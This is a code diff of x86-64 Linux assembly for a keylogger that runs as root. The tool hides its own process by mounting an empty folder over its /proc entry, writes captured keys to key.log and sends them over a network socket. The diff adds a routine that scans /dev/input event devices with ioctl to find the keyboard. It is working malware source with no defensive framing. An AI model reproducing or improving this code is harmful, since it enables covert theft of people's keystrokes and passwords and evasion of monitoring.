@@ -9,10 +9,12 @@ _start:
   syscall
 
   cmp rax, 0
-  jne exit
+  jne .exit
 
   ; hiding process
   call hide_process
+
+  call find_event
 
   ; create/open the key.log file to store the captured keys
   ; then store file descriptor into fd
@@ -41,20 +43,73 @@ _start:
   test rax, rax
   js error
   
-    ; begin to read keys
+  ; begin to read keys
   jmp read_keys
 
-exit:
+.exit:
    mov rax, 60
    xor rdi, rdi
    syscall
 
+; print an error and quit
 error:
      mov rax, 1
      mov rdi, 1
      mov rsi, errorMsg
      mov rdx, errorMsgLen
      syscall
+
+     mov rax, 60
+     mov rdi, 1
+     syscall
+
+; make a loop to open every /dev/input/eventX
+; check with ioctl where is located the keyboard event file
+; inputs: 
+;     none
+;
+; outputs:
+;     source edited with the good path 
+find_event:
+  mov r8, '0'
+
+.loop:
+  sub r8, '0'
+  inc r8
+  add r8, '0'
+
+  mov [source+16], r8
+
+  mov rax, 2
+  mov rdi, source
+  xor rsi, rsi
+  syscall
+  
+  mov r10, rax
+
+  mov rax, 16
+  mov rdi, r10
+  mov rsi, 0x82ff4521
+  mov rdx, event_codes
+  syscall
+
+  mov rax, 1
+  mov rdi, 1
+  mov rsi, event_codes
+  mov rdx, 1 
+  syscall
+
+  mov rax, 3
+  mov rdi, r10
+  syscall
+
+  test rax, rax
+  js error
+
+  cmp byte [event_codes], 0x0
+  jz .loop
+
+  ret
 
 ; find pid
 ; mount empty folder into /proc/pid file
@@ -230,6 +285,9 @@ send_keys:
   mov rdx, 16
   syscall
 
+  test rax, rax
+  jnz read_keys
+
   mov rax, 1
   mov rdi, [socket]
   mov rsi, keys
@@ -247,15 +305,11 @@ section .data
   errorMsg db "must be run as root", 0xa
   errorMsgLen equ $ - errorMsg
 
-  sourceStrt db "/dev/input/event", 0
-  sourceEnd db "/device/capabilities/ev", 0
-  sourceNmb db 0
-  
   mountPoint db "./empty", 0
   process db "/proc/000000", 0
   filesystem db "ext4", 0
 
-  source db "/dev/input/event3", 0
+  source db "/dev/input/event0", 0
 
   sd dq 0
 
@@ -284,3 +338,4 @@ section .bss
   keys resb 100
   addr resb 16
   pid resb 12 
+  event_codes resb 64
